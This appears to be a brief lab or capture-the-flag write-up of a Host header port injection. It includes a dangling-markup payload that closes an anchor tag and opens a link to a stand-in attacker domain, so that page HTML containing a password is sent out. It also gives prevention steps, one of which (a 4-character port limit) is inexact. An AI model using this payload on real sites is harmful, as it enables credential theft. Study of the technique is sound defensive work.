Vulnerability:
	The server checks that the Host header matches a specific domain, but it doesn't properly validate or restrict the port part.
	Because of this, an attacker can inject HTML by breaking out of attributes using the port field, which lets them modify the page's structure and potentially leak sensitive information.
	
Exploit:
	Host: domain.net:'></a>[PAYLOAD]
	
Example:
	Host: domain.net:'></a><a href="https://exploit_domain.net

Explenation:
	-	Using "></a>" we close the tag: "<a>".
	-	Then using '<a href="https://exploit_domain.net' we point to our server and include inside the request the upcoming HTML which contains the password.
	
Prevention:
	-	Make sure that the port part is contains digits only and limit it to 4 characters.
	-	Ignore the port part of the host header.
